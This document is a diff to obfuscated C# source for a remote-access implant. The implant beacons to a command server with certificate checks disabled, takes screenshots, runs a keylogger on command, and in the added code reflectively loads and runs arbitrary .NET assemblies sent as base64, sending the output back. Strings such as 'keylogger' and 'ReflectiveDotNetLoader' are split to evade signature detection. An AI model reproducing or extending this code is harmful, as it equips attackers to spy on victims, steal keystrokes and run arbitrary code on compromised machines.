@@ -16,10 +16,11 @@ using System.Security.Cryptography.X509Certificates;
 using System.Web.Script.Serialization;
 using System.Runtime.InteropServices;
 using System.Timers;
+using System.Reflection;
+using System.Linq;
 
 namespace VAR1
 {
-
     public class VAR2
     {
         public string UUID
@@ -69,8 +70,21 @@ namespace VAR1
         private static Graphics VAR212;
         private static String VAR201 = "";
         private static int VAR203 = 0;
+        private static string VAR7;
+        private static string VAR8;
+        private static byte[] VAR9;
+        private static int VAR10;
+        private static string VAR11;
+        private static int VAR12;
+        private static StringBuilder VAR105 = new StringBuilder();
 
-        public static void VAR204()
+        public static void Main()
+        {
+            //ShowWindow(GetConsoleWindow(), 0);
+            VAR13("[URL]", "[KEY]", "[DELAY]");
+        }
+
+        protected static void VAR204()
         {
             foreach (Screen VAR214 in Screen.AllScreens)
             {
@@ -88,15 +102,7 @@ namespace VAR1
             }
         }
 
-        private static string VAR7;
-        private static string VAR8;
-        private static byte[] VAR9;
-        private static int VAR10;
-        private static string VAR11;
-        private static int VAR12;
-        private static StringBuilder VAR105 = new StringBuilder();
-
-        public static string VAR107()
+        protected static string VAR107()
         {
             var VAR106 = "";
             var VAR108 = GetForegroundWindow();
@@ -109,7 +115,7 @@ namespace VAR1
             return VAR106;
         }
 
-        public static void VAR110(object VAR111, ElapsedEventArgs VAR112)
+        protected static void VAR110(object VAR111, ElapsedEventArgs VAR112)
         {
             if (VAR105.Length != 0)
             {
@@ -120,7 +126,7 @@ namespace VAR1
             VAR105.Clear();
         }
 
-        public static void VAR104()
+        protected static void VAR104()
         {
 
             System.Timers.Timer VAR113 = new System.Timers.Timer();
@@ -403,15 +409,11 @@ namespace VAR1
             }
         }
 
-        public static void Main()
+        protected static void VAR13(string VAR14, string VAR15, string VAR16)
         {
-            ShowWindow(GetConsoleWindow(), 0);
-            VAR13("[URL]", "[KEY]", "[DELAY]");
-        }
-
-        public static void VAR13(string VAR14, string VAR15, string VAR16)
-        {
-            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
+            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate {
+                return true;
+            });
             VAR7 = VAR14;
             VAR8 = VAR37(16);
             VAR9 = Encoding.ASCII.GetBytes(VAR15);
@@ -430,11 +432,12 @@ namespace VAR1
             Thread VAR103 = new Thread(() => VAR104());
             while (!VAR18)
             {
+                VAR2 VAR23 = new VAR2();
                 try
                 {
                     Thread.Sleep(VAR10);
                     string VAR22 = VAR21(null, null);
-                    VAR2 VAR23 = VAR24(VAR22);
+                    VAR23 = VAR24(VAR22);
                     if (VAR23.UUID != null)
                     {
                         VAR23.Data = VAR25(VAR23.Data);
@@ -451,13 +454,21 @@ namespace VAR1
                         {
                             VAR204();
                         }
-                        else if (VAR26[0].Equals("ke"+"y"+"lo"+"gger"+"-start")){
+                        else if (VAR26[0].Equals("ke" + "y" + "lo" + "gger" + "-start"))
+                        {
                             VAR103.Start();
                         }
-                        else if (VAR26[0].Equals("ke"+"y"+"lo"+"gger"+"-stop")){
-                            if(VAR103.IsAlive){
+                        else if (VAR26[0].Equals("ke" + "y" + "lo" + "gger" + "-stop"))
+                        {
+                            if (VAR103.IsAlive)
+                            {
                                 VAR103.Abort();
                             }
+                        }
+                        else if (VAR26[0].Equals("do" + "tn" + "et"))
+                        {
+                            Thread VAR29 = new Thread(() => VAR122(VAR26[1], VAR23.UUID));
+                            VAR29.Start();
                         }
                         else
                         {
@@ -466,15 +477,61 @@ namespace VAR1
                         }
                     }
                 }
-                catch { }
+                catch (Exception VAR133)
+                {
+                    VAR21(Convert.ToBase64String(Encoding.UTF8.GetBytes(VAR133.Message)), VAR23.UUID);
+                }
             }
         }
         protected static string[] VAR27(string VAR30)
         {
             return VAR30.Split(new char[] {
-    ' '
-   }, 2);
+                                ' '
+                        },
+            2);
         }
+
+        protected static void VAR122(string VAR123, string VAR131)
+        {
+            StringWriter VAR134 = new StringWriter();
+            TextWriter VAR135 = Console.Out;
+            Console.SetOut(VAR134);
+            StringBuilder VAR132 = new StringBuilder();
+            byte[] VAR124 = Encoding.ASCII.GetBytes(VAR123);
+            string VAR136 = VAR123.Split(' ')[0];
+            string[] VAR127 = VAR123.Split(' ');
+            if (File.Exists(VAR136))
+            {
+                FileStream VAR125 = new FileStream(VAR136, FileMode.Open);
+                BinaryReader VAR126 = new BinaryReader(VAR125);
+                VAR124 = VAR126.ReadBytes(Convert.ToInt32(VAR125.Length));
+                VAR125.Close();
+                VAR126.Close();
+            } else
+            {
+               VAR124 = Convert.FromBase64String(VAR127[0]);
+            }
+
+            VAR127 = VAR127.Skip(1).ToArray();
+
+            Assembly VAR128 = Assembly.Load(VAR124);
+            MethodInfo VAR129 = VAR128.EntryPoint;
+            VAR132.Append("[Ref"+"lect"+"iveD"+"otN"+"et"+"Loader] EntryPoint is " + VAR129 + Environment.NewLine);
+            if (VAR129 != null)
+            {
+                VAR132.Append("[Ref" + "lect" + "iveD" + "otN" + "et" + "Loader] Passing args: " + String.Join(" ", VAR127) + Environment.NewLine);
+                object o = VAR128.CreateInstance(VAR129.Name);
+                List<string> VAR130 = new List<string>(VAR127);
+                VAR129.Invoke(null, new[] { (object[]) VAR130.ToArray()
+                                });
+            }
+
+            Console.SetOut(VAR135);
+            VAR132.Append(VAR134.ToString());
+            VAR134.Close();
+            VAR21(Convert.ToBase64String(Encoding.UTF8.GetBytes(VAR132.ToString())), VAR131);
+        }
+
         protected static string VAR25(string VAR31)
         {
             byte[] VAR32 = Convert.FromBase64String(VAR31);
@@ -509,7 +566,7 @@ namespace VAR1
             VAR12 = VAR42.Next();
             return VAR39.ToString();
         }
-        public static void VAR28(string VAR44, string VAR45)
+        protected static void VAR28(string VAR44, string VAR45)
         {
             string VAR46;
             StringBuilder VAR47 = new StringBuilder();
@@ -535,7 +592,7 @@ namespace VAR1
             }
             VAR21(Convert.ToBase64String(Encoding.UTF8.GetBytes(VAR46)), VAR45);
         }
-        public static string VAR21(string VAR55, string VAR56)
+        protected static string VAR21(string VAR55, string VAR56)
         {
             byte[] VAR57;
             if (VAR55 != null)
@@ -600,8 +657,13 @@ namespace VAR1
     {
         public static byte[] VAR17(byte[] VAR18, byte[] VAR19)
         {
-            int VAR20, VAR21, VAR22, VAR23, VAR24;
-            int[] VAR25, VAR26;
+            int VAR20,
+            VAR21,
+            VAR22,
+            VAR23,
+            VAR24;
+            int[] VAR25,
+            VAR26;
             byte[] VAR27;
             VAR25 = new int[256];
             VAR26 = new int[256];
